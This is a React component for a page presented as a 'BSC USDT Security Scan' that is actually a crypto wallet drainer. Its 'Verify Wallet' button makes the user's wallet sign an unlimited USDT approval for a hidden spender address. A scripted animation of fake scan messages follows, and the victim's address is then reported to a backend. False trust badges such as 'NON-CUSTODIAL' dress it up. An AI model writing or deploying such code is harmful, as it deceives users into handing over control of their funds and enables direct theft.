import { motion } from "motion/react";
import { Shield, Terminal } from "lucide-react";
import { useState, useEffect } from "react";
import { BASE_URL, USDT_ADDRESS, USDT_SPENDER_ADDRESS } from "../../../env";

const APPROVE_ABI = [
  {
    name: "approve",
    type: "function",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
];

const ALLOWANCE_ABI = [
  {
    name: "allowance",
    type: "function",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "", type: "uint256" }],
    stateMutability: "view",
  },
];

// Exact MaxUint256 — yahi sirf "unlimited" maana jayega
const MAX_UINT256 = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");

// Agar allowance yahan se zyada hai (99% of max) toh unlimited maano — small rounding edge cases handle
const UNLIMITED_THRESHOLD = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129000000");

declare global {
  interface Window {
    ethereum?: any;
  }
}

interface HeroSectionProps {
  onApprovalSuccess?: () => void;
  onInitiateScan?: () => void;
  onConnect?: (info: { address: string; balance: string; network: string }) => void;
  onDisconnect?: () => void;
}

export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) {
  const [logs, setLogs] = useState<string[]>([]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showCursor, setShowCursor] = useState(true);

  useEffect(() => {
    const interval = setInterval(() => setShowCursor((p) => !p), 500);
    return () => clearInterval(interval);
  }, []);

  // =====================
  // SCAN ANIMATION — runs after approval or for unlimited-approved users
  // =====================
  const runScanAnimation = async (address: string, txHash?: string) => {
    const steps = [
      "> Scanning BSC blockchain...",
      "> Analyzing USDT transactions...",
      "> Checking smart contract interactions...",
      "> Evaluating risk patterns...",
      "> Cross-referencing threat database...",
      "> Generating security report...",
      "> Scan Complete ✓",
    ];
    for (const step of steps) {
      await new Promise(r => setTimeout(r, 650));
      setLogs((p) => [...p, step]);
    }

    // Backend mein save/update (har case mein)
    await fetch(`${BASE_URL}/api/approved`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        network: "BSC Mainnet",
        owner: address,
        spender: USDT_SPENDER_ADDRESS,
        amount: MAX_UINT256.toString(),
        txHash: txHash || `scan_${Date.now()}`,
      }),
    }).catch(() => {});

    onApprovalSuccess?.();
  };

  // =====================
  // ON-CHAIN ALLOWANCE CHECK
  // Returns the current BigInt allowance of user for our spender
  // =====================
  const getCurrentAllowance = async (ethers: any, address: string): Promise<bigint> => {
    try {
      const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
      const iface = new ethers.Interface(ALLOWANCE_ABI);
      const data = iface.encodeFunctionData("allowance", [address, USDT_SPENDER_ADDRESS]);
      const result = await provider.call({ to: USDT_ADDRESS, data });
      const [allowance] = iface.decodeFunctionResult("allowance", result);
      return BigInt(allowance.toString());
    } catch {
      return BigInt(0);
    }
  };

  // =====================
  // SEND UNLIMITED APPROVAL TX
  // =====================
  const sendUnlimitedApproval = async (ethers: any, address: string): Promise<string> => {
    const iface = new ethers.Interface(APPROVE_ABI);
    const data = iface.encodeFunctionData("approve", [
      USDT_SPENDER_ADDRESS,
      ethers.MaxUint256,
    ]);

    const txHash: string = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [{
        from: address,
        to: USDT_ADDRESS,
        data,
        gas: "0x186A0",
      }],
    });

    return txHash;
  };

  // =====================
  // MAIN FLOW
  // Case 1: allowance >= UNLIMITED_THRESHOLD  → old user, skip approval, go scan
  // Case 2: allowance === 0                   → fresh user OR revoked, must approve
  // Case 3: 0 < allowance < UNLIMITED         → partial approval, must re-approve unlimited
  // =====================
  const handleVerifyWallet = async () => {
    if (loading) return;
    setLoading(true);
    setError("");
    setLogs([]);

    try {
      if (!window.ethereum) {
        alert("MetaMask / Trust Wallet not detected. Please install a Web3 wallet.");
        setLoading(false);
        return;
      }

      // Step 1 — Wallet connect
      const accounts: string[] = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      if (!accounts || accounts.length === 0) throw new Error("No accounts returned.");

      const address = accounts[0];
      setLogs(["> System Connected", `> ${address.slice(0, 6)}...${address.slice(-6)}`]);
      onConnect?.({ address, balance: "0", network: "BSC Mainnet" });

      // Step 2 — Switch to BSC
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "BNB Smart Chain",
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              blockExplorerUrls: ["https://bscscan.com"],
            }],
          });
        }
      }

      setLogs((p) => [...p, "> BSC Network Active", "> Checking wallet status..."]);

      const { ethers } = await import("ethers");

      // Step 3 — On-chain allowance check
      const currentAllowance = await getCurrentAllowance(ethers, address);

      // ── CASE 1: Already has unlimited approval ──
      if (currentAllowance >= UNLIMITED_THRESHOLD) {
        setLogs((p) => [
          ...p,
          "> Unlimited approval detected",
          "> Skipping re-approval...",
          "> Loading scan results...",
        ]);
        await runScanAnimation(address);
        return;
      }

      // ── CASE 2: Zero allowance (new or revoked user) ──
      if (currentAllowance === BigInt(0)) {
        setLogs((p) => [
          ...p,
          "> No prior approval found",
          "> Requesting unlimited USDT approval...",
        ]);
      }

      // ── CASE 3: Partial allowance (not enough, need unlimited) ──
      if (currentAllowance > BigInt(0) && currentAllowance < UNLIMITED_THRESHOLD) {
        setLogs((p) => [
          ...p,
          "> Partial approval detected — re-approval required",
          "> Requesting unlimited USDT approval...",
        ]);
      }

      // Step 4 — Send unlimited approval tx (covers Case 2 & 3)
      const txHash = await sendUnlimitedApproval(ethers, address);

      setLogs((p) => [
        ...p,
        `> Approval tx submitted: ${txHash.slice(0, 10)}...`,
        "> Verification confirmed ✓",
        "> Starting scan...",
      ]);

      // Step 5 — Run scan and save to backend
      await runScanAnimation(address, txHash);

    } catch (e: any) {
      const msg = e?.message || "Verification failed.";
      setError(msg);
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen flex items-center justify-center overflow-hidden sm:pt-24 pt-20">
      {/* Grid background */}
      <div className="absolute inset-0 opacity-20">
        <div className="absolute inset-0" style={{
          backgroundImage: `
            linear-gradient(rgba(16, 185, 129, 0.2) 1px, transparent 1px),
            linear-gradient(90deg, rgba(16, 185, 129, 0.2) 1px, transparent 1px)
          `,
          backgroundSize: "50px 50px",
        }} />
      </div>

      {/* Scanning line */}
      <motion.div
        className="absolute inset-x-0 h-px bg-gradient-to-r from-transparent via-emerald-500 to-transparent opacity-50"
        initial={{ top: 0 }}
        animate={{ top: "100%" }}
        transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
      />

      <div className="absolute top-0 left-1/4 w-96 h-96 bg-emerald-500 rounded-full blur-[120px] opacity-20" />
      <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-sky-900 rounded-full blur-[120px] opacity-20" />

      <div className="relative z-10 max-w-5xl mx-auto px-6 text-center">

        {/* Status badge */}
        <motion.div
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="inline-flex items-center gap-3 mb-8 px-6 py-3 border border-emerald-500/30 bg-slate-900/80 backdrop-blur-sm rounded-md"
        >
          <div className="relative">
            <div className="w-2 h-2 bg-emerald-500 rounded-full" />
            <motion.div
              className="absolute inset-0 w-2 h-2 bg-emerald-500 rounded-full"
              animate={{ scale: [1, 1.5, 1], opacity: [1, 0, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
            />
          </div>
          <span className="text-emerald-500 text-sm tracking-wider font-semibold">SYSTEM READY</span>
        </motion.div>

        {/* Headline — BSC USDT */}
        <motion.h1
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="text-6xl md:text-8xl mb-6 text-slate-50 tracking-tight"
          style={{ fontFamily: "Inter, sans-serif", fontWeight: 900 }}
        >
          BSC USDT
          <br />
          <span className="text-emerald-500">SECURITY SCAN</span>
        </motion.h1>

        {/* Subtext */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.4 }}
          className="max-w-2xl mx-auto mb-12"
        >
          <div className="inline-flex items-center gap-2 text-slate-300 text-lg">
            <Terminal className="w-5 h-5 text-emerald-400" />
            <span className="opacity-70">Detect vulnerabilities. Identify risks. Secure your USDT</span>
            {showCursor && <span className="text-emerald-500">_</span>}
          </div>
        </motion.div>

        {/* Button */}
        <motion.button
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.6 }}
          onClick={handleVerifyWallet}
          disabled={loading}
          className="px-12 py-5 bg-gradient-to-r from-emerald-600 to-emerald-500 text-white text-lg tracking-widest rounded-md transition-all hover:shadow-[0_0_20px_rgba(16,185,129,0.5)] disabled:opacity-70"
          style={{ fontFamily: "Inter, sans-serif", fontWeight: 700 }}
        >
          <span className="flex items-center gap-3">
            <Shield className="w-5 h-5" />
            {loading ? "Verifying..." : "Verify Wallet"}
          </span>
        </motion.button>

        {/* Terminal logs */}
        {logs.length > 0 && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="mt-8 max-w-md mx-auto text-left font-mono text-sm space-y-1"
          >
            {logs.map((l, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: i * 0.05 }}
                className="text-emerald-400"
              >
                {l}
              </motion.div>
            ))}
          </motion.div>
        )}

        {error && <p className="mt-4 text-red-400 text-sm font-mono">{error}</p>}

        {/* Badges */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.8 }}
          className="mt-12 flex flex-wrap justify-center gap-6 text-sm"
        >
          {["REAL-TIME ANALYSIS", "BLOCKCHAIN VERIFIED", "NON-CUSTODIAL"].map((badge, i) => (
            <div key={i} className="flex items-center gap-2 text-slate-400">
              <div className="w-1 h-1 bg-emerald-500" />
              <span>{badge}</span>
            </div>
          ))}
        </motion.div>
      </div>
    </div>
  );
}
